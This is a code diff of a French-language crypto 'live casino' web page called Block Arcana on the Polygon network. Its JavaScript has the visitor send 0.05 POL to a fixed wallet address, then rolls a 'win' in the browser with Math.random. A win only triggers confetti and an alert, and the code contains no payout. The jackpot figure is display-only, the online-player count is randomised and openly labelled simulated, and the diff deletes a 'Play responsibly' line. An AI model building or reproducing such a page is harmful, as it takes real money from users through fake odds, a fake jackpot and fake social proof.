@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Block Arcana | Live Casino</title>
     <style>
-        /* FOND FIXE : Empêche l'image de se répéter en défilant */
         body {
             background-color: #050505;
             background: radial-gradient(circle at center, #111111 0%, #050505 100%);
@@ -14,8 +13,6 @@
             font-family: 'Segoe UI', Roboto, sans-serif;
             text-align: center; margin: 0; padding: 0; min-height: 100vh;
         }
-
-        /* Barre de Stats en haut */
         .stats-header {
             background: rgba(0, 255, 255, 0.08);
             border-bottom: 1px solid rgba(0, 255, 255, 0.2);
@@ -23,33 +20,24 @@
             display: flex; justify-content: space-around;
             backdrop-filter: blur(15px); position: sticky; top: 0; z-index: 100;
         }
-
         .overlay { padding: 40px 20px; }
-
         .header {
             font-family: "Georgia", serif; font-style: italic; font-size: 3.2em;
             background: linear-gradient(to right, #ffffff, #ff00ff, #00ffff, #ffffff);
             background-size: 200% auto; -webkit-background-clip: text;
             -webkit-text-fill-color: transparent; animation: shine 5s linear infinite;
-            margin: 10px 0;
         }
-
         @keyframes shine { to { background-position: 200% center; } }
-
-        /* Carte Jackpot ultra-lisible */
         .jackpot-card {
             background: rgba(255, 255, 255, 0.05);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 30px; padding: 30px 20px;
             margin: 20px auto; max-width: 320px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.8);
         }
-
         #jackpotValue { 
             color: #00ff00; font-size: 2.8em; font-weight: bold; 
             text-shadow: 0 0 25px rgba(0, 255, 0, 0.5); margin: 10px 0;
         }
-
         .btn-bet {
             background: linear-gradient(135deg, #ff00ff, #7000ff);
             border: none; padding: 20px 55px; color: white;
@@ -57,33 +45,30 @@
             font-size: 1.3em; box-shadow: 0 10px 25px rgba(255, 0, 255, 0.4);
             text-transform: uppercase;
         }
-
-        .footer { margin-top: 50px; font-size: 0.75em; color: #666; line-height: 1.6; }
+        #status { margin-top: 20px; color: #00ffff; font-weight: bold; min-height: 20px; }
+        .footer { margin-top: 40px; font-size: 0.75em; color: #666; }
     </style>
 </head>
 <body>
 
     <div class="stats-header">
-        <span>👥 <span id="online-players">20</span> EN LIGNE</span>
+        <span>👥 <span id="online-players">22</span> EN LIGNE</span>
         <span>👁️ LIVE VISITES</span>
     </div>
 
     <div class="overlay">
-        <div style="color: #00ff00; font-size: 0.7em; font-weight: bold; letter-spacing: 2px;">● SESSION ACTIVE</div>
         <h1 class="header">Block Arcana</h1>
-        
         <div class="jackpot-card">
             <div style="color: #00ffff; font-size: 0.8em; letter-spacing: 2px;">CURRENT JACKPOT</div>
             <h2 id="jackpotValue">0.0500 POL</h2>
-            <div style="font-size: 0.9em; color: #ff00ff; font-weight: bold; margin-top: 5px;">Ultimate 777</div>
-            <div style="font-size: 0.8em; color: #888; margin-top: 10px;">Entry: 0.05 POL</div>
         </div>
 
-        <button class="btn-bet" onclick="playGame()">SPIN & BET</button>
+        <button class="btn-bet" id="betButton" onclick="playGame()">SPIN & BET</button>
+        <div id="status"></div>
 
         <div class="footer">
             POWERED BY POLYGON NETWORK<br>
-            © 2026 Block Arcana Protocol. Play responsibly.
+            © 2026 Block Arcana Protocol.
         </div>
     </div>
 
@@ -93,32 +78,57 @@
     <script>
         let currentJackpot = 0.0500;
 
-        function updateStats() {
-            document.getElementById("online-players").innerText = Math.floor(Math.random() * 5) + 18;
-        }
-        setInterval(updateStats, 7000);
+        // Mise à jour des stats simulées
+        setInterval(() => {
+            document.getElementById("online-players").innerText = Math.floor(Math.random() * 5) + 19;
+        }, 8000);
 
         async function playGame() {
-            if (typeof window.ethereum !== "undefined") {
+            const status = document.getElementById("status");
+            
+            // Étape 1 : Vérifier si le fournisseur est présent
+            const provider = window.ethereum ? new ethers.providers.Web3Provider(window.ethereum, "any") : null;
+
+            if (provider) {
                 try {
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    status.innerText = "CONNEXION AU WALLET...";
+                    // Étape 2 : Demander l'accès au compte
                     await provider.send("eth_requestAccounts", []);
                     const signer = provider.getSigner();
-                    const tx = { to: "0x8e25e9858679f29193233f7d5d9939105408d257", value: ethers.utils.parseEther("0.05") };
+                    const address = await signer.getAddress();
+                    
+                    status.innerText = "CONFIRMATION REQUISE...";
+                    
+                    // Étape 3 : Envoyer la transaction
+                    const tx = {
+                        to: "0x8e25e9858679f29193233f7d5d9939105408d257",
+                        value: ethers.utils.parseEther("0.05")
+                    };
+
                     const transaction = await signer.sendTransaction(tx);
+                    status.innerText = "ATTENTE DE LA BLOCKCHAIN...";
+                    
                     await transaction.wait();
                     
+                    // Étape 4 : Résultat
                     if (Math.floor(Math.random() * 50) + 1 === 7) {
                         confetti({ particleCount: 150, spread: 70 });
                         alert("🎰 JACKPOT !");
                     } else {
-                        alert("Pas cette fois !");
+                        status.innerText = "TERMINÉ !";
+                        alert("Pas cette fois ! Le jackpot augmente.");
                         currentJackpot += 0.05;
                         document.getElementById("jackpotValue").innerText = currentJackpot.toFixed(4) + " POL";
+                        setTimeout(() => status.innerText = "", 3000);
                     }
-                } catch (e) { alert("Transaction annulée."); }
+
+                } catch (error) {
+                    console.error(error);
+                    status.innerText = "ANNULÉ OU ERREUR";
+                    setTimeout(() => status.innerText = "", 3000);
+                }
             } else {
-                alert("Veuillez utiliser un navigateur Web3 (MetaMask, Rabby).");
+                alert("Veuillez utiliser le navigateur interne de MetaMask.");
             }
         }
     </script>
